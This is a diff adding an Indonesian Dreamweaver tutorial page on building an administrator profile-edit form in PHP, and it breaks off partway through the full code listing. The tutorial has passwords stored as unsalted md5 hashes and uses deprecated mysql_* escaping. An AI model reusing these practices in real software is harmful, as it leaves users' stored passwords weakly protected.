@@ -1,0 +1,494 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Untitled Document</title>
+</head>
+
+<body>
+<div class="title_con">
+  <h1>Halaman Edit Profile Administrator</h1>
+</div>
+<div class="content_col">
+  <h3><strong>Halaman Edit Profile Administrator -</strong> Pada tutorial sebelumnya kita sudah <a title="Membuat Halaman Log out" href="http://mous-design.com/membuat-halaman-log-out-di-dreamweaver-cs3.html" target="_blank"><strong>membuat halaman log out,</strong></a> hehehe maaf sudah lama gak pernah update blog ini, banyak kerjaan soalnya.</h3>
+  <p>Kali ini saya mau ngelanjutin <em><strong>tutorial membuat website dengan dreamweaver</strong></em>, buat rekan - rekan yang kebingungan <span style="text-decoration:underline; ">belajar membuat website dengan dreamweaver</span> di blog ini, saya sarankan agar membaca dari awal <a title="tutorial dreamweaver" href="http://mous-design.com/topics/tutorial-dreamweaver"><span style="text-decoration:underline; "><em><strong>(bisa diklik disini)</strong></em></span></a>,
+ karena tutorial disini saya ajarkan secara bertahap agar kita 
+mengerti&nbsp; tahapan - tahapan membuat website dengan dreamweaver.</p>
+  <h3>Seperti biasa tutorial membuat website ini saya akan terangkan   
+secara singkat tapi mudah - mudahan bisa dimengerti, kali ini kita akan 
+  membuat&nbsp;<span style="text-decoration:underline; "><em>Halaman Edit Profile Administrator</em></span> website.</h3>
+  <p>Langsung aja pertama buka file home.php yang ada di dalam folder fileadmin.</p>
+  <p>Kemudian klik <strong>File &gt; Save As. ( atau tekan Shitft + Ctrl + S) &gt; beri nama editprofile.php</strong></p>
+  <p><img class="alignnone size-full wp-image-1529 img" title="save-as-di-dreamweaver-cs3-dalam-tutorial-membuat-Halaman Edit Profile Administrator" src="17%20%20Halaman%20Edit%20Profile%20Administrator_files/save-as-di-dreamweaver-cs3-dalam-tutorial-membuat-halaman-we.jpg" alt="save as di dreamweaver cs3 dalam tutorial membuat halaman website Halaman Edit Profile Administrator" height="352" width="566"></p>
+  <p>Jika sudah, melalui design view ubah tulisan "<strong>Admin Home</strong>" menjadi "<strong>Profile Admin</strong>" (saya beri tanda kota merah).</p>
+  <p><img class="alignnone size-full wp-image-1534 img" title="Halaman Edit Profile Administrator - menghapus-tulisan-admin-home-di-dreamweaver-cs3-dalam-tutorial-membuat-halaman-website" src="17%20%20Halaman%20Edit%20Profile%20Administrator_files/menghapus-tulisan-admin-home-di-dreamweaver-cs3-dalam-tutori.jpg" alt="menghapus tulisan admin home di dreamweaver cs3 dalam tutorial membuat halaman website Halaman Edit Profile Administrator" height="449" width="654"></p>
+  <p>Kemudian hapus tulisan yang di bawahnya (saya beri tanda kotak hijau).</p>
+  <p>Kali ini dalam membuat <strong>edit profile administrator website dengan dreamweaver</strong>, kita akan membuat <strong>Recordset </strong>untuk menampilkan data - data administrator yang sudah tersimpan didalam database pada saat anda melakukan registrasi.</p>
+  <p>Pada menu bar dreamweaver, kli <strong>Insert &gt; Data Object &gt; Recordset,</strong></p>
+  <p><img class="alignnone size-full wp-image-1535 img" title="Halaman Edit Profile Administrator - recordset-di-dreamweaver-cs3-dalam-tutorial-membuat-halaman-website" src="17%20%20Halaman%20Edit%20Profile%20Administrator_files/recordset-di-dreamweaver-cs3-dalam-tutorial-membuat-halaman-.jpg" alt="recordset di dreamweaver cs3 dalam tutorial membuat halaman website Halaman Edit Profile Administrator" height="354" width="489"></p>
+  <p>Isikan pengaturannya sebagai berikut :</p>
+  <ul>
+    <li>Name : profile_admin</li>
+    <li>Connection : websiteku</li>
+    <li>Table : admin</li>
+    <li>Columns : all</li>
+    <li>Filter : nama</li>
+    <li><strong>URL Parameter </strong>ubahmenjadi<strong> Session Variable</strong>, disebelahnya ketikkan <strong>MM_Username</strong></li>
+    <li><strong>Jika sudah klik ok.</strong></li>
+  </ul>
+  <p>Selanjutnya melalui <strong>Code View</strong> anda cari kode berikut</p>
+  <div>
+    <div id="highlighter_171710" class="syntaxhighlighter xml">
+      <table border="0" cellpadding="0" cellspacing="0">
+        <tbody>
+          <tr>
+            <td class="gutter"><div class="line number1 index0 alt2">1</div>
+              <div class="line number2 index1 alt1">2</div>
+              <div class="line number3 index2 alt2">3</div>
+              <div class="line number4 index3 alt1">4</div></td>
+            <td class="code"><div class="container">
+              <div class="line number1 index0 alt2"><code class="xml plain">&lt;</code><code class="xml keyword">div</code> <code class="xml color1">id</code><code class="xml plain">=</code><code class="xml string">"conten"</code><code class="xml plain">&gt;</code></div>
+              <div class="line number2 index1 alt1"><code class="xml plain">&lt;</code><code class="xml keyword">h3</code><code class="xml plain">&gt;Admin Home&lt;/</code><code class="xml keyword">h3</code><code class="xml plain">&gt;</code></div>
+              <div class="line number3 index2 alt2"><code class="xml plain">&lt;</code><code class="xml keyword">p</code><code class="xml plain">&gt;&lt;/</code><code class="xml keyword">p</code><code class="xml plain">&gt;</code></div>
+              <div class="line number4 index3 alt1"><code class="xml plain">&lt;/</code><code class="xml keyword">div</code><code class="xml plain">&gt;</code></div>
+            </div></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <p>Kemudian diantara kode <strong>&lt;p&gt;&lt;/p&gt;</strong> anda ketikkan, "Anda login sebagai".</p>
+  <p>Pada tab <strong>Application</strong> &gt; klik <strong>Binding</strong>,
+   maka akan terlihat Recordset (profile_admin), &gt; drag "Nama" (yang 
+  saya beri tanda hijau) letakkan di sebelah tulisan "Anda login 
+sebagai".</p>
+  <p><img class="alignnone size-full wp-image-1536 img" title="tab-application-dreamweaver-cs3-dalam-tutorial-membuat-halaman-website" src="17%20%20Halaman%20Edit%20Profile%20Administrator_files/tab-application-dreamweaver-cs3-dalam-tutorial-membuat-halam.jpg" alt="tab application dreamweaver cs3 dalam tutorial membuat halaman website Halaman Edit Profile Administrator" height="352" width="240"></p>
+  <p>maka kodenya akan menjadi</p>
+  <div>
+    <div id="highlighter_54451" class="syntaxhighlighter xml">
+      <table border="0" cellpadding="0" cellspacing="0">
+        <tbody>
+          <tr>
+            <td class="gutter"><div class="line number1 index0 alt2">1</div>
+              <div class="line number2 index1 alt1">2</div>
+              <div class="line number3 index2 alt2">3</div></td>
+            <td class="code"><div class="container">
+              <div class="line number1 index0 alt2"><code class="xml plain">&lt;</code><code class="xml keyword">p</code><code class="xml plain">&gt;</code></div>
+              <div class="line number2 index1 alt1"><code class="xml plain">Anda login sebagai &lt;?</code><code class="xml keyword">php</code> <code class="xml plain">echo $row_profile_admin['nama']; ?&gt;</code></div>
+              <div class="line number3 index2 alt2"><code class="xml plain">&lt;/</code><code class="xml keyword">p</code><code class="xml plain">&gt;</code></div>
+            </div></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <p>Selanjutnya untuk membuat paragraf baru, di bawah kode di atas anda
+   ketikkan &lt;p&gt;&lt;/p&gt;, kemudian klik lagi di tengah - tengah 
+kode   &lt;p&gt;&lt;/p&gt;.</p>
+  <p>Selanjutnya pada menubar Dreamweaver klik <strong>Insert &gt; Data Objects &gt; Update Record &gt; Record Update Form Wizard. </strong>Setelah muncul jendela Record Update Form, anda isikan pengaturannya sebagai beriku :</p>
+  <p><img class="alignnone size-full wp-image-1537 img" title="record-update-form-dreamweaver-cs3-dalam-tutorial-membuat-halaman-website" src="17%20%20Halaman%20Edit%20Profile%20Administrator_files/record-update-form-dreamweaver-cs3-dalam-tutorial-membuat-ha.jpg" alt="record update form dreamweaver cs3 dalam tutorial membuat halaman website Halaman Edit Profile Administrator" height="348" width="500"></p>
+  <ul>
+    <li>Connection : websiteku</li>
+    <li>Table to update : admin</li>
+    <li>Select record from : profile_admin</li>
+    <li>Unique key column : id</li>
+    <li>After updating, go to : editprofile.php (yang ada dalam folder file admin)</li>
+    <li>Pada form field klik id kemudian klik tanda min, ini berfungsi untuk menghilangkan field id,</li>
+    <li>Klik kembali pada form <strong>field password</strong>, kemudian <strong>display as</strong> ubah menjadi <strong>password field,</strong></li>
+    <li>Terakhir klik ok.</li>
+  </ul>
+  <p>Kemudian cari kode berikut, kira2 berada pada baris ke 85.</p>
+  <div>
+    <div id="highlighter_215373" class="syntaxhighlighter php">
+      <table border="0" cellpadding="0" cellspacing="0">
+        <tbody>
+          <tr>
+            <td class="gutter"><div class="line number1 index0 alt2">1</div></td>
+            <td class="code"><div class="container">
+              <div class="line number1 index0 alt2"><code class="php plain">GetSQLValueString(</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'password'</code><code class="php plain">], </code><code class="php string">"text"</code><code class="php plain">),</code></div>
+            </div></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <p>Dan tambahkan fungsi md5, caranya ganti kode di atas menjadi</p>
+  <div>
+    <div id="highlighter_949327" class="syntaxhighlighter php">
+      <table border="0" cellpadding="0" cellspacing="0">
+        <tbody>
+          <tr>
+            <td class="gutter"><div class="line number1 index0 alt2">1</div></td>
+            <td class="code"><div class="container">
+              <div class="line number1 index0 alt2"><code class="php plain">GetSQLValueString(md5 (</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'password'</code><code class="php plain">]), </code><code class="php string">"text"</code><code class="php plain">),</code></div>
+            </div></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <p>Kalau sudah, untuk menyimpan <strong>Halaman Edit Profile Administrator </strong> tekan <strong>Ctrl + S.</strong></p>
+  <p>maka kode keseluruhannya kira2 seperti ini</p>
+  <div>
+    <div id="highlighter_775474" class="syntaxhighlighter php">
+      <table border="0" cellpadding="0" cellspacing="0">
+        <tbody>
+          <tr>
+            <td class="gutter"><div class="line number1 index0 alt2">1</div>
+              <div class="line number2 index1 alt1">2</div>
+              <div class="line number3 index2 alt2">3</div>
+              <div class="line number4 index3 alt1">4</div>
+              <div class="line number5 index4 alt2">5</div>
+              <div class="line number6 index5 alt1">6</div>
+              <div class="line number7 index6 alt2">7</div>
+              <div class="line number8 index7 alt1">8</div>
+              <div class="line number9 index8 alt2">9</div>
+              <div class="line number10 index9 alt1">10</div>
+              <div class="line number11 index10 alt2">11</div>
+              <div class="line number12 index11 alt1">12</div>
+              <div class="line number13 index12 alt2">13</div>
+              <div class="line number14 index13 alt1">14</div>
+              <div class="line number15 index14 alt2">15</div>
+              <div class="line number16 index15 alt1">16</div>
+              <div class="line number17 index16 alt2">17</div>
+              <div class="line number18 index17 alt1">18</div>
+              <div class="line number19 index18 alt2">19</div>
+              <div class="line number20 index19 alt1">20</div>
+              <div class="line number21 index20 alt2">21</div>
+              <div class="line number22 index21 alt1">22</div>
+              <div class="line number23 index22 alt2">23</div>
+              <div class="line number24 index23 alt1">24</div>
+              <div class="line number25 index24 alt2">25</div>
+              <div class="line number26 index25 alt1">26</div>
+              <div class="line number27 index26 alt2">27</div>
+              <div class="line number28 index27 alt1">28</div>
+              <div class="line number29 index28 alt2">29</div>
+              <div class="line number30 index29 alt1">30</div>
+              <div class="line number31 index30 alt2">31</div>
+              <div class="line number32 index31 alt1">32</div>
+              <div class="line number33 index32 alt2">33</div>
+              <div class="line number34 index33 alt1">34</div>
+              <div class="line number35 index34 alt2">35</div>
+              <div class="line number36 index35 alt1">36</div>
+              <div class="line number37 index36 alt2">37</div>
+              <div class="line number38 index37 alt1">38</div>
+              <div class="line number39 index38 alt2">39</div>
+              <div class="line number40 index39 alt1">40</div>
+              <div class="line number41 index40 alt2">41</div>
+              <div class="line number42 index41 alt1">42</div>
+              <div class="line number43 index42 alt2">43</div>
+              <div class="line number44 index43 alt1">44</div>
+              <div class="line number45 index44 alt2">45</div>
+              <div class="line number46 index45 alt1">46</div>
+              <div class="line number47 index46 alt2">47</div>
+              <div class="line number48 index47 alt1">48</div>
+              <div class="line number49 index48 alt2">49</div>
+              <div class="line number50 index49 alt1">50</div>
+              <div class="line number51 index50 alt2">51</div>
+              <div class="line number52 index51 alt1">52</div>
+              <div class="line number53 index52 alt2">53</div>
+              <div class="line number54 index53 alt1">54</div>
+              <div class="line number55 index54 alt2">55</div>
+              <div class="line number56 index55 alt1">56</div>
+              <div class="line number57 index56 alt2">57</div>
+              <div class="line number58 index57 alt1">58</div>
+              <div class="line number59 index58 alt2">59</div>
+              <div class="line number60 index59 alt1">60</div>
+              <div class="line number61 index60 alt2">61</div>
+              <div class="line number62 index61 alt1">62</div>
+              <div class="line number63 index62 alt2">63</div>
+              <div class="line number64 index63 alt1">64</div>
+              <div class="line number65 index64 alt2">65</div>
+              <div class="line number66 index65 alt1">66</div>
+              <div class="line number67 index66 alt2">67</div>
+              <div class="line number68 index67 alt1">68</div>
+              <div class="line number69 index68 alt2">69</div>
+              <div class="line number70 index69 alt1">70</div>
+              <div class="line number71 index70 alt2">71</div>
+              <div class="line number72 index71 alt1">72</div>
+              <div class="line number73 index72 alt2">73</div>
+              <div class="line number74 index73 alt1">74</div>
+              <div class="line number75 index74 alt2">75</div>
+              <div class="line number76 index75 alt1">76</div>
+              <div class="line number77 index76 alt2">77</div>
+              <div class="line number78 index77 alt1">78</div>
+              <div class="line number79 index78 alt2">79</div>
+              <div class="line number80 index79 alt1">80</div>
+              <div class="line number81 index80 alt2">81</div>
+              <div class="line number82 index81 alt1">82</div>
+              <div class="line number83 index82 alt2">83</div>
+              <div class="line number84 index83 alt1">84</div>
+              <div class="line number85 index84 alt2">85</div>
+              <div class="line number86 index85 alt1">86</div>
+              <div class="line number87 index86 alt2">87</div>
+              <div class="line number88 index87 alt1">88</div>
+              <div class="line number89 index88 alt2">89</div>
+              <div class="line number90 index89 alt1">90</div>
+              <div class="line number91 index90 alt2">91</div>
+              <div class="line number92 index91 alt1">92</div>
+              <div class="line number93 index92 alt2">93</div>
+              <div class="line number94 index93 alt1">94</div>
+              <div class="line number95 index94 alt2">95</div>
+              <div class="line number96 index95 alt1">96</div>
+              <div class="line number97 index96 alt2">97</div>
+              <div class="line number98 index97 alt1">98</div>
+              <div class="line number99 index98 alt2">99</div>
+              <div class="line number100 index99 alt1">100</div>
+              <div class="line number101 index100 alt2">101</div>
+              <div class="line number102 index101 alt1">102</div>
+              <div class="line number103 index102 alt2">103</div>
+              <div class="line number104 index103 alt1">104</div>
+              <div class="line number105 index104 alt2">105</div>
+              <div class="line number106 index105 alt1">106</div>
+              <div class="line number107 index106 alt2">107</div>
+              <div class="line number108 index107 alt1">108</div>
+              <div class="line number109 index108 alt2">109</div>
+              <div class="line number110 index109 alt1">110</div>
+              <div class="line number111 index110 alt2">111</div>
+              <div class="line number112 index111 alt1">112</div>
+              <div class="line number113 index112 alt2">113</div>
+              <div class="line number114 index113 alt1">114</div>
+              <div class="line number115 index114 alt2">115</div>
+              <div class="line number116 index115 alt1">116</div>
+              <div class="line number117 index116 alt2">117</div>
+              <div class="line number118 index117 alt1">118</div>
+              <div class="line number119 index118 alt2">119</div>
+              <div class="line number120 index119 alt1">120</div>
+              <div class="line number121 index120 alt2">121</div>
+              <div class="line number122 index121 alt1">122</div>
+              <div class="line number123 index122 alt2">123</div>
+              <div class="line number124 index123 alt1">124</div>
+              <div class="line number125 index124 alt2">125</div>
+              <div class="line number126 index125 alt1">126</div>
+              <div class="line number127 index126 alt2">127</div>
+              <div class="line number128 index127 alt1">128</div>
+              <div class="line number129 index128 alt2">129</div>
+              <div class="line number130 index129 alt1">130</div>
+              <div class="line number131 index130 alt2">131</div>
+              <div class="line number132 index131 alt1">132</div>
+              <div class="line number133 index132 alt2">133</div>
+              <div class="line number134 index133 alt1">134</div>
+              <div class="line number135 index134 alt2">135</div>
+              <div class="line number136 index135 alt1">136</div>
+              <div class="line number137 index136 alt2">137</div>
+              <div class="line number138 index137 alt1">138</div>
+              <div class="line number139 index138 alt2">139</div>
+              <div class="line number140 index139 alt1">140</div>
+              <div class="line number141 index140 alt2">141</div>
+              <div class="line number142 index141 alt1">142</div>
+              <div class="line number143 index142 alt2">143</div>
+              <div class="line number144 index143 alt1">144</div>
+              <div class="line number145 index144 alt2">145</div>
+              <div class="line number146 index145 alt1">146</div>
+              <div class="line number147 index146 alt2">147</div>
+              <div class="line number148 index147 alt1">148</div>
+              <div class="line number149 index148 alt2">149</div>
+              <div class="line number150 index149 alt1">150</div>
+              <div class="line number151 index150 alt2">151</div>
+              <div class="line number152 index151 alt1">152</div>
+              <div class="line number153 index152 alt2">153</div>
+              <div class="line number154 index153 alt1">154</div>
+              <div class="line number155 index154 alt2">155</div>
+              <div class="line number156 index155 alt1">156</div>
+              <div class="line number157 index156 alt2">157</div>
+              <div class="line number158 index157 alt1">158</div>
+              <div class="line number159 index158 alt2">159</div>
+              <div class="line number160 index159 alt1">160</div>
+              <div class="line number161 index160 alt2">161</div>
+              <div class="line number162 index161 alt1">162</div>
+              <div class="line number163 index162 alt2">163</div>
+              <div class="line number164 index163 alt1">164</div>
+              <div class="line number165 index164 alt2">165</div>
+              <div class="line number166 index165 alt1">166</div>
+              <div class="line number167 index166 alt2">167</div>
+              <div class="line number168 index167 alt1">168</div></td>
+            <td class="code"><div class="container">
+              <div class="line number1 index0 alt2"><code class="php plain">&lt;?php </code><code class="php keyword">require_once</code><code class="php plain">(</code><code class="php string">'../Connections/websiteku.php'</code><code class="php plain">); ?&gt;</code></div>
+              <div class="line number2 index1 alt1"><code class="php plain">&lt;?php</code></div>
+              <div class="line number3 index2 alt2"><code class="php keyword">if</code> <code class="php plain">(!isset(</code><code class="php variable">$_SESSION</code><code class="php plain">)) {</code></div>
+              <div class="line number4 index3 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">session_start();</code></div>
+              <div class="line number5 index4 alt2"><code class="php plain">}</code></div>
+              <div class="line number6 index5 alt1"><code class="php variable">$MM_authorizedUsers</code> <code class="php plain">= </code><code class="php string">""</code><code class="php plain">;</code></div>
+              <div class="line number7 index6 alt2"><code class="php variable">$MM_donotCheckaccess</code> <code class="php plain">= </code><code class="php string">"true"</code><code class="php plain">;</code></div>
+              <div class="line number8 index7 alt1">&nbsp;</div>
+              <div class="line number9 index8 alt2"><code class="php comments">// *** Restrict Access To Page: Grant or deny access to this page</code></div>
+              <div class="line number10 index9 alt1"><code class="php keyword">function</code> <code class="php plain">isAuthorized(</code><code class="php variable">$strUsers</code><code class="php plain">, </code><code class="php variable">$strGroups</code><code class="php plain">, </code><code class="php variable">$UserName</code><code class="php plain">, </code><code class="php variable">$UserGroup</code><code class="php plain">) { </code></div>
+              <div class="line number11 index10 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php comments">// For security, start by assuming the visitor is NOT authorized. </code></div>
+              <div class="line number12 index11 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$isValid</code> <code class="php plain">= False; </code></div>
+              <div class="line number13 index12 alt2">&nbsp;</div>
+              <div class="line number14 index13 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php comments">// When a visitor has logged into this site, the Session variable MM_Username set equal to their username. </code></div>
+              <div class="line number15 index14 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php comments">// Therefore, we know that a user is NOT logged in if that Session variable is blank. </code></div>
+              <div class="line number16 index15 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(!</code><code class="php functions">empty</code><code class="php plain">(</code><code class="php variable">$UserName</code><code class="php plain">)) { </code></div>
+              <div class="line number17 index16 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// Besides being logged in, you may restrict access to only certain users based on an ID established when they login. </code></div>
+              <div class="line number18 index17 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// Parse the strings into arrays. </code></div>
+              <div class="line number19 index18 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$arrUsers</code> <code class="php plain">= </code><code class="php functions">Explode</code><code class="php plain">(</code><code class="php string">","</code><code class="php plain">, </code><code class="php variable">$strUsers</code><code class="php plain">); </code></div>
+              <div class="line number20 index19 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$arrGroups</code> <code class="php plain">= </code><code class="php functions">Explode</code><code class="php plain">(</code><code class="php string">","</code><code class="php plain">, </code><code class="php variable">$strGroups</code><code class="php plain">); </code></div>
+              <div class="line number21 index20 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(in_array(</code><code class="php variable">$UserName</code><code class="php plain">, </code><code class="php variable">$arrUsers</code><code class="php plain">)) { </code></div>
+              <div class="line number22 index21 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$isValid</code> <code class="php plain">= true; </code></div>
+              <div class="line number23 index22 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">} </code></div>
+              <div class="line number24 index23 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// Or, you may restrict access to only certain users based on their username. </code></div>
+              <div class="line number25 index24 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(in_array(</code><code class="php variable">$UserGroup</code><code class="php plain">, </code><code class="php variable">$arrGroups</code><code class="php plain">)) { </code></div>
+              <div class="line number26 index25 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$isValid</code> <code class="php plain">= true; </code></div>
+              <div class="line number27 index26 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">} </code></div>
+              <div class="line number28 index27 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">((</code><code class="php variable">$strUsers</code> <code class="php plain">== </code><code class="php string">""</code><code class="php plain">) &amp;&amp; true) { </code></div>
+              <div class="line number29 index28 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$isValid</code> <code class="php plain">= true; </code></div>
+              <div class="line number30 index29 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">} </code></div>
+              <div class="line number31 index30 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">} </code></div>
+              <div class="line number32 index31 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php variable">$isValid</code><code class="php plain">; </code></div>
+              <div class="line number33 index32 alt2"><code class="php plain">}</code></div>
+              <div class="line number34 index33 alt1">&nbsp;</div>
+              <div class="line number35 index34 alt2"><code class="php variable">$MM_restrictGoTo</code> <code class="php plain">= </code><code class="php string">"logout.php"</code><code class="php plain">;</code></div>
+              <div class="line number36 index35 alt1"><code class="php keyword">if</code> <code class="php plain">(!((isset(</code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'MM_Username'</code><code class="php plain">])) &amp;&amp; (isAuthorized(</code><code class="php string">""</code><code class="php plain">,</code><code class="php variable">$MM_authorizedUsers</code><code class="php plain">, </code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'MM_Username'</code><code class="php plain">], </code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'MM_UserGroup'</code><code class="php plain">])))) {&nbsp;&nbsp; </code></div>
+              <div class="line number37 index36 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$MM_qsChar</code> <code class="php plain">= </code><code class="php string">"?"</code><code class="php plain">;</code></div>
+              <div class="line number38 index37 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$MM_referrer</code> <code class="php plain">= </code><code class="php variable">$_SERVER</code><code class="php plain">[</code><code class="php string">'PHP_SELF'</code><code class="php plain">];</code></div>
+              <div class="line number39 index38 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(</code><code class="php functions">strpos</code><code class="php plain">(</code><code class="php variable">$MM_restrictGoTo</code><code class="php plain">, </code><code class="php string">"?"</code><code class="php plain">)) </code><code class="php variable">$MM_qsChar</code> <code class="php plain">= </code><code class="php string">"&amp;"</code><code class="php plain">;</code></div>
+              <div class="line number40 index39 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(isset(</code><code class="php variable">$QUERY_STRING</code><code class="php plain">) &amp;&amp; </code><code class="php functions">strlen</code><code class="php plain">(</code><code class="php variable">$QUERY_STRING</code><code class="php plain">) &gt; 0) </code></div>
+              <div class="line number41 index40 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$MM_referrer</code> <code class="php plain">.= </code><code class="php string">"?"</code> <code class="php plain">. </code><code class="php variable">$QUERY_STRING</code><code class="php plain">;</code></div>
+              <div class="line number42 index41 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$MM_restrictGoTo</code> <code class="php plain">= </code><code class="php variable">$MM_restrictGoTo</code><code class="php plain">. </code><code class="php variable">$MM_qsChar</code> <code class="php plain">. </code><code class="php string">"accesscheck="</code> <code class="php plain">. urlencode(</code><code class="php variable">$MM_referrer</code><code class="php plain">);</code></div>
+              <div class="line number43 index42 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">header(</code><code class="php string">"Location: "</code><code class="php plain">. </code><code class="php variable">$MM_restrictGoTo</code><code class="php plain">); </code></div>
+              <div class="line number44 index43 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php functions">exit</code><code class="php plain">;</code></div>
+              <div class="line number45 index44 alt2"><code class="php plain">}</code></div>
+              <div class="line number46 index45 alt1"><code class="php plain">?&gt;</code></div>
+              <div class="line number47 index46 alt2"><code class="php plain">&lt;?php</code></div>
+              <div class="line number48 index47 alt1"><code class="php keyword">if</code> <code class="php plain">(!function_exists(</code><code class="php string">"GetSQLValueString"</code><code class="php plain">)) {</code></div>
+              <div class="line number49 index48 alt2"><code class="php keyword">function</code> <code class="php plain">GetSQLValueString(</code><code class="php variable">$theValue</code><code class="php plain">, </code><code class="php variable">$theType</code><code class="php plain">, </code><code class="php variable">$theDefinedValue</code> <code class="php plain">= </code><code class="php string">""</code><code class="php plain">, </code><code class="php variable">$theNotDefinedValue</code> <code class="php plain">= </code><code class="php string">""</code><code class="php plain">) </code></div>
+              <div class="line number50 index49 alt1"><code class="php plain">{</code></div>
+              <div class="line number51 index50 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$theValue</code> <code class="php plain">= get_magic_quotes_gpc() ? </code><code class="php functions">stripslashes</code><code class="php plain">(</code><code class="php variable">$theValue</code><code class="php plain">) : </code><code class="php variable">$theValue</code><code class="php plain">;</code></div>
+              <div class="line number52 index51 alt1">&nbsp;</div>
+              <div class="line number53 index52 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$theValue</code> <code class="php plain">= function_exists(</code><code class="php string">"mysql_real_escape_string"</code><code class="php plain">) ? mysql_real_escape_string(</code><code class="php variable">$theValue</code><code class="php plain">) : mysql_escape_string(</code><code class="php variable">$theValue</code><code class="php plain">);</code></div>
+              <div class="line number54 index53 alt1">&nbsp;</div>
+              <div class="line number55 index54 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">switch</code> <code class="php plain">(</code><code class="php variable">$theType</code><code class="php plain">) {</code></div>
+              <div class="line number56 index55 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php string">"text"</code><code class="php plain">:</code></div>
+              <div class="line number57 index56 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$theValue</code> <code class="php plain">= (</code><code class="php variable">$theValue</code> <code class="php plain">!= </code><code class="php string">""</code><code class="php plain">) ? </code><code class="php string">"'"</code> <code class="php plain">. </code><code class="php variable">$theValue</code> <code class="php plain">. </code><code class="php string">"'"</code> <code class="php plain">: </code><code class="php string">"NULL"</code><code class="php plain">;</code></div>
+              <div class="line number58 index57 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">break</code><code class="php plain">;&nbsp;&nbsp;&nbsp; </code></div>
+              <div class="line number59 index58 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php string">"long"</code><code class="php plain">:</code></div>
+              <div class="line number60 index59 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php string">"int"</code><code class="php plain">:</code></div>
+              <div class="line number61 index60 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$theValue</code> <code class="php plain">= (</code><code class="php variable">$theValue</code> <code class="php plain">!= </code><code class="php string">""</code><code class="php plain">) ? </code><code class="php functions">intval</code><code class="php plain">(</code><code class="php variable">$theValue</code><code class="php plain">) : </code><code class="php string">"NULL"</code><code class="php plain">;</code></div>
+              <div class="line number62 index61 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">break</code><code class="php plain">;</code></div>
+              <div class="line number63 index62 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php string">"double"</code><code class="php plain">:</code></div>
